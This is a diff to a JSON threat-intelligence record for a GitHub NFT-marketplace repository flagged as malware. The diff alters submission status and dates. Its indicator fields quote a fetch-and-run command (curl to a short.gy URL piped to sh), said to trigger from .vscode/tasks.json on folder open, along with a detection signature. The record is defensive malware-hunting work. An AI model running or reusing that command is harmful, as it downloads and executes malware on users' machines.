@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:ishanrt119/nft-marketplace",
     "kind": "repository",
+    "family": "",
     "id": "ishanrt119/nft-marketplace",
     "url": "https://github.com/ishanrt119/NFT-Marketplace",
     "registry": "github",
@@ -18,10 +19,10 @@
     "iocs": "cgbrandh.short.gy; https://cgbrandh.short.gy/prUjNg5m; https://cgbrandh.short.gy/prUjNg5l; https://cgbrandh.short.gy/prUjNg5w; curl 'https://cgbrandh.short.gy/prUjNg5m' -L | sh; .vscode/tasks.json",
     "matched_signatures": "folderOpen curl filename:tasks.json",
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
-    "osm_status": "submitted",
-    "osm_threat_id": "09a0a32b-9700-487d-9c80-e10867d1cfc0",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/ishanrt119_nft-marketplace.json",
     "reviewer_decision": "",
     "notes": ""
@@ -68,7 +69,7 @@
     "evidence_references": "https://github.com/ishanrt119/nft-marketplace/blob/8f72181a1c13ba899631257024aeb0e756beaee2/.vscode/tasks.json\nhttps://github.com/ishanrt119/nft-marketplace/blob/8f72181a1c13ba899631257024aeb0e756beaee2/tailwind.config.js#L76",
     "verified_iocs": "cgbrandh.short.gy\nhttps://cgbrandh.short.gy/prUjNg5m\nhttps://cgbrandh.short.gy/prUjNg5l\nhttps://cgbrandh.short.gy/prUjNg5w\ncurl 'https://cgbrandh.short.gy/prUjNg5m' -L | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
